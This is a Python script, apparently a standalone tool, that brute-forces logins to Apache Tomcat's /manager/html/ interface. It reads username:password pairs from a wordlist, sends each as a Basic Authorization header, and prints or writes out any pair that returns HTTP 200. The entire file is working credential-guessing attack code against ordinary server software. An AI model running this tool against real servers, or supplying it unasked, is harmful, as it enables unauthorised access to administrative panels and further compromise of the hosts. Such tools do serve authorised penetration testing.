import requests
import base64
import argparse

def output_file_check(url,file,output_file):
    if output_file == "none":
        scanner_nofile(url,file)
    else:
        scanner_with_file(url,file,output_file)

def encode(creds):
    encoded_string_bytes = creds.encode("ascii")
    encoded_base64_bytes = base64.b64encode(encoded_string_bytes)
    base64_string = encoded_base64_bytes.decode("ascii")
    auth = "Basic " + base64_string 

    return auth

def scanner_nofile(url,file):
    full_url = url + "/manager/html/"
    wordlist_file = open(file,'r')

    for creds in wordlist_file:
        creds = creds.strip()
        auth = encode(creds)
        
        auth_header = {"Authorization": auth}
        req_site = requests.get(full_url,headers=auth_header)
    
        if req_site.status_code == 200:
            print("Founds Credentials: ",creds)
        else:
            continue
    
    wordlist_file.close()
    print("Done!")
    exit()

def scanner_with_file(url,file,output_file):
    full_url = url + "/manager/html/" 
    wordlist_file = open(file,'r')
    
    creds_found_file = open(output_file,"w") 
    creds_found_file.write("Found Credentials:\n")
    creds_found_file.close()

    for creds in wordlist_file:
        creds = creds.strip()
        auth = encode(creds)
        
        auth_header = {"Authorization": auth}
        req_site = requests.get(full_url,headers=auth_header)
    
        if req_site.status_code == 200:
            print("Founds Credentials: ",creds)
            creds_found_file = open(output_file,"a")
            creds_found_file.write(creds)
            creds_found_file.write("\n")
        else:
            continue
    
    wordlist_file.close()
    creds_found_file.close()
    print("Done! Check your " + output_file + " for any passwords found!")
    exit()

def main():
    parser = argparse.ArgumentParser(description='Tomcat User:Password Scanner')

    parser.add_argument('-t', metavar="<Target's URL>", help='target/host IP, E.G: http://scantomcat.blah', required=True)
    parser.add_argument('-f', metavar="<Wordlist>",help='WordList To Use. Required format is username:password', required=True)
    parser.add_argument('-w', metavar='<Output>', default='none', help='Name of output file', required=False)

    args = parser.parse_args()

    url = args.t
    file = args.f
    output_file = args.w

    print("Welcome to Tomcat user:password scanner!")
    print("Scanning for usernames and passwords...")
    
    while True:
        try:
            output_file_check(url,file,output_file)
        except KeyboardInterrupt:
            print("Bye Bye!")
            exit()

if __name__ == "__main__":
    main()